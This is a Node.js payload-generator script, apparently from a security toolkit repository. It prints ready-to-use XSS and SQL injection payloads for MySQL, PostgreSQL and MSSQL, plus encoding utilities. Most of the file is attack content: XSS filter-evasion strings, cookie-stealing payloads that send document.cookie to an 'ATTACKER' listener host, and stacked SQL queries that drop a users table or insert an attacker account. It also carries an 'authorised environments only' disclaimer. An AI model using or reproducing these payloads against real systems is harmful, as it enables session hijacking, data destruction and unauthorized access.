#!/usr/bin/env node
/**
 * CyberSec Toolkit — Web Payload Generator
 * ==========================================
 * Generates XSS and SQL injection payloads with various encodings.
 * Also provides encoding/decoding utilities for web security testing.
 *
 * Usage:
 *   node payload_generator.js xss
 *   node payload_generator.js xss --encode url
 *   node payload_generator.js sqli --db mysql
 *   node payload_generator.js encode "text to encode" --type base64
 *   node payload_generator.js decode "dGV4dA==" --type base64
 *
 * Educational use only. See ETHICAL_USE.txt before use.
 */

"use strict";

// ─────────────────────────────────────────────────────────────────────────────
// Payload databases
// ─────────────────────────────────────────────────────────────────────────────

const XSS_PAYLOADS = {
  basic: [
    `<script>alert('XSS')</script>`,
    `<img src=x onerror=alert('XSS')>`,
    `<svg onload=alert('XSS')>`,
    `"><script>alert('XSS')</script>`,
    `'><script>alert('XSS')</script>`,
    `</title><script>alert('XSS')</script>`,
    `<body onload=alert('XSS')>`,
    `<iframe src="javascript:alert('XSS')">`,
  ],
  evadefilter: [
    `<ScRiPt>alert('XSS')</sCrIpT>`,
    `<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,
    `<svg/onload=alert(1)>`,
    `<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`,
    `<details open ontoggle=alert(1)>`,
    `<input onfocus=alert(1) autofocus>`,
    `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
  ],
  dom: [
    `#"><img src=/ onerror=alert(2)>`,
    `javascript:void(document.cookie)`,
    `#<script>alert(document.cookie)</script>`,
    `"><svg/onload=confirm(document.domain)>`,
  ],
  steal_cookie: [
    `<script>document.write('<img src="http://ATTACKER/?c='+document.cookie+'">')</script>`,
    `<img src=x onerror="fetch('http://ATTACKER/steal?c='+btoa(document.cookie))">`,
    `"><script>new Image().src='http://ATTACKER/c?='+document.cookie</script>`,
  ],
};

const SQLI_PAYLOADS = {
  mysql: {
    detection: [
      `' OR '1'='1`,
      `' OR '1'='1' --`,
      `1' AND '1'='1`,
      `1' AND '1'='2`,
      `' OR 1=1 -- -`,
      `" OR ""="`,
    ],
    union: [
      `' UNION SELECT NULL-- -`,
      `' UNION SELECT NULL,NULL-- -`,
      `' UNION SELECT NULL,NULL,NULL-- -`,
      `' UNION SELECT 1,user(),version()-- -`,
      `' UNION SELECT table_name,NULL FROM information_schema.tables-- -`,
    ],
    blind: [
      `' AND SLEEP(5)-- -`,
      `' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -`,
      `1' AND IF(1=1,SLEEP(5),0)-- -`,
    ],
    stacked: [
      `'; DROP TABLE users-- -`,
      `'; INSERT INTO users(username,password) VALUES('attacker','pwned')-- -`,
    ],
  },
  postgres: {
    detection: [
      `' OR '1'='1`,
      `'; SELECT pg_sleep(5)--`,
      `'; SELECT version()--`,
    ],
    union: [
      `' UNION SELECT NULL--`,
      `' UNION SELECT NULL,NULL--`,
      `' UNION SELECT current_user,version()--`,
      `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
    ],
    blind: [
      `'; SELECT pg_sleep(5)--`,
      `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`,
    ],
  },
  mssql: {
    detection: [
      `' OR '1'='1`,
      `'; WAITFOR DELAY '0:0:5'--`,
      `1; SELECT @@version--`,
    ],
    union: [
      `' UNION SELECT NULL--`,
      `' UNION SELECT NULL,NULL--`,
      `' UNION SELECT @@version,NULL--`,
    ],
    blind: [
      `'; WAITFOR DELAY '0:0:5'--`,
      `'; IF (1=1) WAITFOR DELAY '0:0:5'--`,
    ],
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// Encoding utilities
// ─────────────────────────────────────────────────────────────────────────────

const encoders = {
  base64: {
    encode: (s) => Buffer.from(s, "utf8").toString("base64"),
    decode: (s) => Buffer.from(s, "base64").toString("utf8"),
  },
  url: {
    encode: (s) => encodeURIComponent(s),
    decode: (s) => decodeURIComponent(s),
  },
  urlFull: {
    encode: (s) => [...s].map((c) => "%" + c.charCodeAt(0).toString(16).padStart(2, "0")).join(""),
    decode: (s) => decodeURIComponent(s),
  },
  html: {
    encode: (s) =>
      s.replace(/[&<>"'`]/g, (c) =>
        ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;" }[c])
      ),
    decode: (s) =>
      s.replace(/&amp;|&lt;|&gt;|&quot;|&#x27;|&#x60;/g, (m) =>
        ({ "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"', "&#x27;": "'", "&#x60;": "`" }[m])
      ),
  },
  hex: {
    encode: (s) => Buffer.from(s, "utf8").toString("hex"),
    decode: (s) => Buffer.from(s, "hex").toString("utf8"),
  },
  unicode: {
    encode: (s) => [...s].map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join(""),
    decode: (s) => s.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16))),
  },
  rot13: {
    encode: (s) =>
      s.replace(/[a-zA-Z]/g, (c) => {
        const base = c < "a" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      }),
    decode: function(s) { return this.encode(s); }, // ROT13 is symmetric
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// Output helpers
// ─────────────────────────────────────────────────────────────────────────────

const c = {
  reset:  "\x1b[0m",
  green:  "\x1b[92m",
  yellow: "\x1b[93m",
  cyan:   "\x1b[96m",
  red:    "\x1b[91m",
  bold:   "\x1b[1m",
  dim:    "\x1b[2m",
};

const green  = (s) => `${c.green}${s}${c.reset}`;
const yellow = (s) => `${c.yellow}${s}${c.reset}`;
const cyan   = (s) => `${c.cyan}${s}${c.reset}`;
const bold   = (s) => `${c.bold}${s}${c.reset}`;
const dim    = (s) => `${c.dim}${s}${c.reset}`;

function banner() {
  console.log(cyan(`
  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝
  Generator — CyberSec Toolkit v1.0
  github.com/nikhiltomar2712/cybersec
`));
}

function printPayloadList(title, payloads, encodeType) {
  console.log(bold(`\n  ─── ${title} ────────────────────────────────────────`));
  payloads.forEach((p, i) => {
    let display = p;
    if (encodeType && encoders[encodeType]) {
      display = encoders[encodeType].encode(p);
    }
    console.log(`  ${dim(String(i + 1).padStart(2, " "))}  ${green(display)}`);
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Command handlers
// ─────────────────────────────────────────────────────────────────────────────

function cmdXSS(opts) {
  const enc = opts.encode || null;
  if (enc && !encoders[enc]) {
    console.error(c.red + `[!] Unknown encoding: ${enc}` + c.reset);
    console.error("  Available: " + Object.keys(encoders).join(", "));
    process.exit(1);
  }
  if (enc) console.log(yellow(`\n  [*] Applying encoding: ${enc}`));

  printPayloadList("Basic XSS",       XSS_PAYLOADS.basic,       enc);
  printPayloadList("Filter Evasion",  XSS_PAYLOADS.evadefilter, enc);
  printPayloadList("DOM-based",       XSS_PAYLOADS.dom,         enc);
  printPayloadList("Cookie Stealing", XSS_PAYLOADS.steal_cookie,enc);

  console.log(dim("\n  [i] Replace ATTACKER with your listener IP in cookie-stealing payloads."));
  console.log(dim("  [i] Always test in authorised environments only.\n"));
}

function cmdSQLi(opts) {
  const db = (opts.db || "mysql").toLowerCase();
  if (!SQLI_PAYLOADS[db]) {
    console.error(c.red + `[!] Unknown DB: ${db}` + c.reset);
    console.error("  Available: " + Object.keys(SQLI_PAYLOADS).join(", "));
    process.exit(1);
  }
  const db_payloads = SQLI_PAYLOADS[db];
  console.log(yellow(`\n  [*] Target DBMS: ${db.toUpperCase()}`));

  for (const [category, payloads] of Object.entries(db_payloads)) {
    printPayloadList(`${db.toUpperCase()} — ${category}`, payloads, null);
  }
  console.log(dim("\n  [i] Test in authorised environments only.\n"));
}

function cmdEncode(text, opts) {
  const type = opts.type || "base64";
  if (!encoders[type]) {
    console.error(c.red + `[!] Unknown encoding: ${type}` + c.reset);
    console.error("  Available: " + Object.keys(encoders).join(", "));
    process.exit(1);
  }
  const result = encoders[type].encode(text);
  console.log(`\n  ${bold("Input :")} ${text}`);
  console.log(`  ${bold("Type  :")} ${type}`);
  console.log(`  ${bold("Output:")} ${green(result)}\n`);
}

function cmdDecode(text, opts) {
  const type = opts.type || "base64";
  if (!encoders[type]) {
    console.error(c.red + `[!] Unknown encoding: ${type}` + c.reset);
    process.exit(1);
  }
  try {
    const result = encoders[type].decode(text);
    console.log(`\n  ${bold("Input :")} ${text}`);
    console.log(`  ${bold("Type  :")} ${type}`);
    console.log(`  ${bold("Output:")} ${green(result)}\n`);
  } catch (e) {
    console.error(c.red + `[!] Decode failed: ${e.message}` + c.reset);
    process.exit(1);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Argument parsing (manual, no external deps)
// ─────────────────────────────────────────────────────────────────────────────

function parseArgs(argv) {
  const args = argv.slice(2);
  if (!args.length) return { cmd: "help" };

  const cmd = args[0];
  const opts = {};
  let positional = [];

  for (let i = 1; i < args.length; i++) {
    if (args[i].startsWith("--")) {
      const key = args[i].slice(2);
      opts[key] = args[i + 1] || true;
      i++;
    } else {
      positional.push(args[i]);
    }
  }
  return { cmd, opts, positional };
}

function printHelp() {
  console.log(`
  ${bold("Usage:")}
    node payload_generator.js <command> [options]

  ${bold("Commands:")}
    xss                         List XSS payloads
    sqli                        List SQL injection payloads
    encode <text>               Encode text
    decode <text>               Decode text
    help                        Show this help

  ${bold("Options:")}
    --encode <type>             Encoding for XSS output (url, base64, html, hex, unicode, rot13, urlFull)
    --db     <type>             DB for SQLi payloads (mysql, postgres, mssql)  [default: mysql]
    --type   <enc>              Encoding type for encode/decode  [default: base64]

  ${bold("Examples:")}
    node payload_generator.js xss
    node payload_generator.js xss --encode url
    node payload_generator.js sqli --db postgres
    node payload_generator.js encode "hello world" --type base64
    node payload_generator.js decode "aGVsbG8gd29ybGQ=" --type base64
    node payload_generator.js encode "<script>" --type html
  `);
}

// ─────────────────────────────────────────────────────────────────────────────
// Main
// ─────────────────────────────────────────────────────────────────────────────

(function main() {
  banner();
  const { cmd, opts = {}, positional = [] } = parseArgs(process.argv);

  switch (cmd) {
    case "xss":
      cmdXSS(opts);
      break;
    case "sqli":
      cmdSQLi(opts);
      break;
    case "encode":
      if (!positional.length) { console.error(c.red + "[!] Provide text to encode" + c.reset); process.exit(1); }
      cmdEncode(positional.join(" "), opts);
      break;
    case "decode":
      if (!positional.length) { console.error(c.red + "[!] Provide text to decode" + c.reset); process.exit(1); }
      cmdDecode(positional.join(" "), opts);
      break;
    default:
      printHelp();
  }
})();
